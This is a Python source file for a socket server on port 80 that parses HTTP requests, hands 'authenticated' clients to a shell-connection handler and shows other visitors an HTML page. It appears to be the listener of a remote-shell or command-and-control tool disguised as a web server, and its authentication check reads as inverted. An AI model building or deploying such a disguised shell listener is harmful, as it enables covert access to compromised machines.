import socket
import threading
from HttpRequest import HttpRequest
from Handler import Handler


class Communicator:
    def __init__(self, host='127.0.0.1', port=80):
        """
        Constructor of Communicator
        :param host: ip address of server (default- Loopback)
        :param port: listening port (default- HTTP)
        """
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind((host, port))
        self.__threads = list()
        print("[+] Server started on port", port)

    def listen(self):
        """
        This function listens for new connections and routing them for compatible handler
        :return: None
        """
        while True:
            self.__sock.listen()
            client, addr = self.__sock.accept()
            #threading.Thread(target=self.__handle_new_client, args=(client, addr)).start()
            self.__handle_new_client(client, addr)

    @staticmethod
    def read_whole_socket(sock):
        """
        This function read whole buffer from a socket- unlimited recv() function
        :param sock: socket for reading his buffer
        :type sock: socket
        :return: socket's buffer
        :rtype: str
        """
        data = b''
        while True:
            part = sock.recv(1024)
            data += part
            if len(part) < 1024:
                break
        return data.decode()

    def __handle_new_client(self, client_sock, addr):
        """
        This function checking connection's authentication and routing for compatible handler
        :param client_sock: socket of client
        :type client_sock: socket
        :param addr: ip address and port
        :type addr: tuple
        :return: None
        """
        data = self.read_whole_socket(client_sock)
        request = HttpRequest.parse_http_request(data)
        if request:
            if not HttpRequest.authentication_source(request):
                print("[+] Authentication succeed ->", addr)
                Handler.handle_shell_connection(client_sock, addr)
            else:
                print("[-] Authentication failed ->", addr, "- redirect to HTML page")
                Handler.handle_unknown_source(client_sock)